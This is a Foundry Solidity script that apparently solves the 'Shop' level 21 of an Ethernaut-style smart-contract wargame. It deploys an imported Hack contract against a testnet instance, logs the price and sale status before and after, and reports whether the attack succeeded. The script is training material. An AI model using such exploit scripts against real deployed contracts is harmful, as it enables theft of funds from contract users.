// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Shop, Hack} from "../src/level21.sol";

contract Level21Script is Script {
    function run(address instanceAddress) external {
        Shop target = Shop(instanceAddress);
        uint256 priceBefore = target.price();
        bool isSoldBefore = target.isSold();
        console.log("price before: ", priceBefore);
        console.log("isSold before: ", isSoldBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        hackContract.hack();
        vm.stopBroadcast();

        uint256 priceAfter = target.price();
        bool isSoldAfter = target.isSold();
        console.log("price after: ", priceAfter);
        console.log("isSold after: ", isSoldAfter);

        console.log("Attack successful: ", isSoldAfter && priceAfter < 100);
    }
}
//forge script script/level21.s.sol:Level21Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account yourkey --sig "run(address)" your instance address
